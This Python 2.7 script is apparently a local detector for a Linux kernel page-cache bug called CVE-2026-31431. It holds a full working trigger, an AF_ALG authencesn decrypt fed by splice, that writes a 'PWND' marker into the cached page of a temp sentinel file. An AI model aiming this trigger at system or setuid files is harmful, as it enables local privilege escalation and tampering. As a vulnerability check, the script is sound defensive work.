#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-
from __future__ import print_function

"""
CVE-2026-31431 ("Copy Fail") vulnerability detector.

Python 2.7 compatible version.

SAFE BY DESIGN
  * Operates only on a sentinel file created by the current user in a temp dir.
  * Does NOT touch /usr/bin/su or other system binaries.
  * Intended as a local vulnerability detector for authorized hosts only.
  * Exit 0 = NOT vulnerable / prerequisite not met
  * Exit 1 = test error
  * Exit 2 = VULNERABLE / page cache was modified through the tested path
"""

import binascii
import ctypes
import errno
import os
import socket
import struct
import sys
import tempfile


AF_ALG                    = 38
SOL_ALG                   = 279
ALG_SET_KEY               = 1
ALG_SET_IV                = 2
ALG_SET_OP                = 3
ALG_SET_AEAD_ASSOCLEN     = 4
ALG_OP_DECRYPT            = 0
CRYPTO_AUTHENC_KEYA_PARAM = 1

ALG_NAME = "authencesn(hmac(sha256),cbc(aes))"
PAGE     = 4096
ASSOCLEN = 8
CRYPTLEN = 16
TAGLEN   = 16
MARKER   = b"PWND"

SOCK_SEQPACKET = getattr(socket, "SOCK_SEQPACKET", 5)
MSG_MORE       = getattr(socket, "MSG_MORE", 0x8000)

EBADMSG    = getattr(errno, "EBADMSG", 74)
EINVAL     = getattr(errno, "EINVAL", 22)
EOPNOTSUPP = getattr(errno, "EOPNOTSUPP", 95)
ENOTSUP    = getattr(errno, "ENOTSUP", EOPNOTSUPP)

try:
    libc = ctypes.CDLL(None, use_errno=True)
except TypeError:
    # Very old ctypes fallback. Python 2.7 normally supports use_errno.
    libc = ctypes.CDLL(None)

try:
    unicode
except NameError:
    unicode = str

try:
    xrange
except NameError:
    xrange = range

if not hasattr(ctypes, "c_ssize_t"):
    ctypes.c_ssize_t = ctypes.c_long


class IOVec(ctypes.Structure):
    _fields_ = [
        ("iov_base", ctypes.c_void_p),
        ("iov_len", ctypes.c_size_t),
    ]


class MsgHdr(ctypes.Structure):
    _fields_ = [
        ("msg_name", ctypes.c_void_p),
        ("msg_namelen", ctypes.c_uint),
        ("msg_iov", ctypes.POINTER(IOVec)),
        ("msg_iovlen", ctypes.c_size_t),
        ("msg_control", ctypes.c_void_p),
        ("msg_controllen", ctypes.c_size_t),
        ("msg_flags", ctypes.c_int),
    ]


class Cmsghdr(ctypes.Structure):
    _fields_ = [
        ("cmsg_len", ctypes.c_size_t),
        ("cmsg_level", ctypes.c_int),
        ("cmsg_type", ctypes.c_int),
    ]


# Minimal libc prototypes for better 32/64-bit argument handling.
libc.socket.argtypes = [ctypes.c_int, ctypes.c_int, ctypes.c_int]
libc.socket.restype = ctypes.c_int

libc.bind.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_uint]
libc.bind.restype = ctypes.c_int

libc.setsockopt.argtypes = [
    ctypes.c_int, ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_uint
]
libc.setsockopt.restype = ctypes.c_int

libc.accept.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p]
libc.accept.restype = ctypes.c_int

libc.sendmsg.argtypes = [ctypes.c_int, ctypes.POINTER(MsgHdr), ctypes.c_int]
libc.sendmsg.restype = ctypes.c_ssize_t

libc.recv.argtypes = [ctypes.c_int, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_int]
libc.recv.restype = ctypes.c_ssize_t

if hasattr(libc, "splice"):
    libc.splice.argtypes = [
        ctypes.c_int, ctypes.c_void_p,
        ctypes.c_int, ctypes.c_void_p,
        ctypes.c_size_t, ctypes.c_uint,
    ]
    libc.splice.restype = ctypes.c_ssize_t


def _get_errno():
    try:
        return ctypes.get_errno()
    except AttributeError:
        return errno.EINVAL


def _raise_oserror():
    err = _get_errno()
    raise OSError(err, os.strerror(err))


def _to_bytes(s):
    if isinstance(s, unicode):
        return s.encode("latin-1")
    return s


def _zpad(s, n):
    s = _to_bytes(s)
    if len(s) > n:
        s = s[:n]
    return s + (b"\x00" * (n - len(s)))


def _safe_close(fd):
    if fd is None:
        return
    try:
        os.close(fd)
    except OSError:
        pass


def _hex(data):
    h = binascii.hexlify(data)
    if isinstance(h, unicode):
        return h
    try:
        return h.decode("ascii")
    except AttributeError:
        return h


def uname_release():
    # Python 2 returns a tuple from os.uname(); Python 3 returns a named tuple.
    return os.uname()[2]


def uname_machine():
    return os.uname()[4]


def _cmsg_align(n):
    # Linux CMSG_ALIGN() uses sizeof(long). This matches pointer width.
    align = ctypes.sizeof(ctypes.c_long)
    return (n + align - 1) & ~(align - 1)


def _cmsg_len(data_len):
    # Linux CMSG_LEN(data_len)
    return _cmsg_align(ctypes.sizeof(Cmsghdr)) + data_len


def _cmsg_space(data_len):
    # Linux CMSG_SPACE(data_len)
    return _cmsg_align(ctypes.sizeof(Cmsghdr)) + _cmsg_align(data_len)


def raw_socket():
    fd = libc.socket(AF_ALG, SOCK_SEQPACKET, 0)
    if fd < 0:
        _raise_oserror()
    return fd


def raw_bind_alg(fd, alg_type, alg_name):
    # struct sockaddr_alg {
    #   __u16 salg_family;
    #   __u8  salg_type[14];
    #   __u32 salg_feat;
    #   __u32 salg_mask;
    #   __u8  salg_name[64];
    # };
    sockaddr_alg = struct.pack(
        "=H14sII64s",
        AF_ALG,
        _zpad(alg_type, 14),
        0,
        0,
        _zpad(alg_name, 64),
    )

    buf = ctypes.create_string_buffer(sockaddr_alg, len(sockaddr_alg))
    ret = libc.bind(fd, ctypes.cast(buf, ctypes.c_void_p), len(sockaddr_alg))
    if ret < 0:
        _raise_oserror()


def raw_setsockopt(fd, level, optname, value):
    value = _to_bytes(value)
    buf = ctypes.create_string_buffer(value, len(value))
    ret = libc.setsockopt(
        fd,
        level,
        optname,
        ctypes.cast(buf, ctypes.c_void_p),
        len(value),
    )
    if ret < 0:
        _raise_oserror()


def raw_accept(fd):
    ret = libc.accept(fd, None, None)
    if ret < 0:
        _raise_oserror()
    return ret


def build_control_messages(cmsgs):
    total = 0
    normalized = []

    for level, ctype, data in cmsgs:
        data = _to_bytes(data)
        normalized.append((level, ctype, data))
        total += _cmsg_space(len(data))

    ctrl = ctypes.create_string_buffer(total)
    offset = 0

    for level, ctype, data in normalized:
        hdr = Cmsghdr.from_buffer(ctrl, offset)
        hdr.cmsg_len = _cmsg_len(len(data))
        hdr.cmsg_level = level
        hdr.cmsg_type = ctype

        data_offset = offset + _cmsg_align(ctypes.sizeof(Cmsghdr))
        ctypes.memmove(
            ctypes.addressof(ctrl) + data_offset,
            data,
            len(data),
        )

        offset += _cmsg_space(len(data))

    return ctrl


def raw_sendmsg(fd, payloads, cmsgs, flags):
    payload = b"".join([_to_bytes(x) for x in payloads])
    payload_buf = ctypes.create_string_buffer(payload, len(payload))

    iov = IOVec(
        ctypes.cast(payload_buf, ctypes.c_void_p),
        len(payload),
    )

    ctrl = build_control_messages(cmsgs)

    msg = MsgHdr()
    msg.msg_name = None
    msg.msg_namelen = 0
    msg.msg_iov = ctypes.pointer(iov)
    msg.msg_iovlen = 1
    msg.msg_control = ctypes.cast(ctrl, ctypes.c_void_p)
    msg.msg_controllen = ctypes.sizeof(ctrl)
    msg.msg_flags = 0

    ret = libc.sendmsg(fd, ctypes.byref(msg), flags)
    if ret < 0:
        _raise_oserror()
    return ret


def raw_recv(fd, n):
    buf = ctypes.create_string_buffer(n)
    ret = libc.recv(fd, ctypes.cast(buf, ctypes.c_void_p), n, 0)
    if ret < 0:
        _raise_oserror()
    return buf.raw[:ret]


def raw_splice(fd_in, fd_out, count, offset_src=None, offset_dst=None):
    if not hasattr(libc, "splice"):
        raise RuntimeError("libc.splice unavailable on this system")

    off_in_ref = None
    off_out_ref = None

    if offset_src is not None:
        off_in_val = ctypes.c_longlong(offset_src)
        off_in_ref = ctypes.byref(off_in_val)

    if offset_dst is not None:
        off_out_val = ctypes.c_longlong(offset_dst)
        off_out_ref = ctypes.byref(off_out_val)

    ret = libc.splice(fd_in, off_in_ref, fd_out, off_out_ref, count, 0)
    if ret < 0:
        _raise_oserror()
    return ret


def build_authenc_keyblob(authkey, enckey):
    # struct rtattr { u16 rta_len; u16 rta_type } || __be32 enckeylen || keys
    rtattr = struct.pack("HH", 8, CRYPTO_AUTHENC_KEYA_PARAM)
    keyparam = struct.pack(">I", len(enckey))
    return rtattr + keyparam + authkey + enckey


def precheck():
    if not os.path.exists("/proc/crypto"):
        return "/proc/crypto missing"

    fd = None
    try:
        fd = raw_socket()
    except OSError as e:
        return "AF_ALG socket family unavailable (%s)" % e.strerror
    finally:
        _safe_close(fd)

    fd = None
    try:
        fd = raw_socket()
        raw_bind_alg(fd, "aead", ALG_NAME)
    except OSError as e:
        return "%r cannot be instantiated (%s)" % (ALG_NAME, e.strerror)
    finally:
        _safe_close(fd)

    return None


def attempt_trigger(target_path):
    sentinel = (b"COPYFAIL-SENTINEL-UNCORRUPTED!!\n" * (PAGE // 32))[:PAGE]

    with open(target_path, "wb") as f:
        f.write(sentinel)

    fd_target = None
    master = None
    op = None
    pr = None
    pw = None

    try:
        # Populate page cache.
        fd_target = os.open(target_path, os.O_RDONLY)
        os.read(fd_target, PAGE)
        os.lseek(fd_target, 0, os.SEEK_SET)

        # Master socket: bind + key.
        master = raw_socket()
        raw_bind_alg(master, "aead", ALG_NAME)
        raw_setsockopt(
            master,
            SOL_ALG,
            ALG_SET_KEY,
            build_authenc_keyblob(b"\x00" * 32, b"\x00" * 16),
        )

        op = raw_accept(master)

        # AAD bytes 4..7 are seqno_lo. Pick MARKER so corruption is obvious.
        aad = b"\x00" * 4 + MARKER
        cmsg = [
            (SOL_ALG, ALG_SET_OP,            struct.pack("I", ALG_OP_DECRYPT)),
            (SOL_ALG, ALG_SET_IV,            struct.pack("I", 16) + b"\x00" * 16),
            (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("I", ASSOCLEN)),
        ]

        raw_sendmsg(op, [aad], cmsg, MSG_MORE)

        # Splice CRYPTLEN+TAGLEN bytes from the sentinel file page cache into
        # the AF_ALG operation socket.
        pr, pw = os.pipe()

        try:
            n = raw_splice(fd_target, pw, CRYPTLEN + TAGLEN, offset_src=0)
            if n != CRYPTLEN + TAGLEN:
                raise RuntimeError("splice file->pipe short: %d" % n)

            n = raw_splice(pr, op, n)
            if n != CRYPTLEN + TAGLEN:
                raise RuntimeError("splice pipe->op short: %d" % n)

        except OSError as e:
            if e.errno in (EOPNOTSUPP, ENOTSUP):
                raise RuntimeError(
                    "splice into AF_ALG socket not supported on this kernel - "
                    "the page-cache attack vector is not reachable here"
                )
            raise

        # Drive the algorithm. Auth check is expected to fail; EBADMSG / EINVAL
        # is acceptable because the detector only cares whether the page-cache
        # scratch write path was reached.
        try:
            raw_recv(op, ASSOCLEN + CRYPTLEN + TAGLEN)
        except OSError as e:
            if e.errno not in (EBADMSG, EINVAL):
                raise

        # Read back through the same fd to observe the page cache.
        os.lseek(fd_target, 0, os.SEEK_SET)
        after = os.read(fd_target, PAGE)

        return after, sentinel

    finally:
        _safe_close(op)
        _safe_close(master)
        _safe_close(pr)
        _safe_close(pw)
        _safe_close(fd_target)


def kernel_in_affected_line():
    # Per the disclosure text in the original script, fixes landed on the
    # 6.12, 6.17 and 6.18 stable lines. Keep this as an informational hint;
    # the actual verdict is based on the local trigger result.
    rel = uname_release().split("-")[0]
    parts = rel.split(".")

    try:
        major = int(parts[0])
        minor = int(parts[1])
    except (ValueError, IndexError):
        return False

    return (major, minor) >= (6, 12)


def main():
    if sys.version_info[:2] < (2, 7):
        print("[!] This script requires Python 2.7 or newer.", file=sys.stderr)
        return 1

    print("[*] CVE-2026-31431 detector  kernel=%s  arch=%s" %
          (uname_release(), uname_machine()))

    if not kernel_in_affected_line():
        print("[i] Kernel %s predates the affected 6.12/6.17/6.18 lines; "
              "trigger may not apply even if prerequisites match." %
              uname_release())

    reason = precheck()
    if reason:
        print("[+] Precondition not met (%s). NOT vulnerable." % reason)
        return 0

    print("[+] AF_ALG + %r loadable - precondition met." % ALG_NAME)

    tmp = tempfile.mkdtemp(prefix="copyfail-")
    target = os.path.join(tmp, "sentinel.bin")

    try:
        after, sentinel = attempt_trigger(target)
    except Exception as e:
        print("[!] Trigger failed: %s: %s" % (type(e).__name__, e))
        return 1
    finally:
        try:
            os.remove(target)
        except OSError:
            pass

        try:
            os.rmdir(tmp)
        except OSError:
            pass

    marker_off = after.find(MARKER)
    marker_orig = sentinel.find(MARKER)

    diff_count = 0
    first_diff = None
    limit = min(len(after), len(sentinel), PAGE)

    for i in xrange(limit):
        if after[i] != sentinel[i]:
            diff_count += 1
            if first_diff is None:
                first_diff = i

    if marker_off >= 0 and marker_orig < 0:
        start = max(marker_off - 4, 0)
        end = marker_off + 12
        ctx = after[start:end]

        print("[!] VULNERABLE to CVE-2026-31431.")
        print("[!]   Marker %r, AAD seqno_lo, landed in the spliced "
              "page-cache page at offset %d." % (MARKER, marker_off))
        print("[!]   Surrounding bytes: %s  (%r)" % (_hex(ctx), ctx))
        print("[!] Apply the upstream fix or block algif_aead immediately.")
        return 2

    if diff_count:
        window = after[first_diff:first_diff + 16]

        print("[!] Page cache MODIFIED via in-place AEAD splice path "
              "(%d bytes changed, first at offset %d)." %
              (diff_count, first_diff))
        print("[!]   Window: %s" % _hex(window))
        print("[!]   The controllable scratch-write marker did not land, but "
              "the kernel still allowed a page-cache page into the writable "
              "AEAD destination scatterlist.")
        print("[!]   Treat as VULNERABLE to the underlying bug class until "
              "a patched kernel is installed.")
        return 2

    print("[+] Page cache intact. NOT vulnerable on this kernel.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
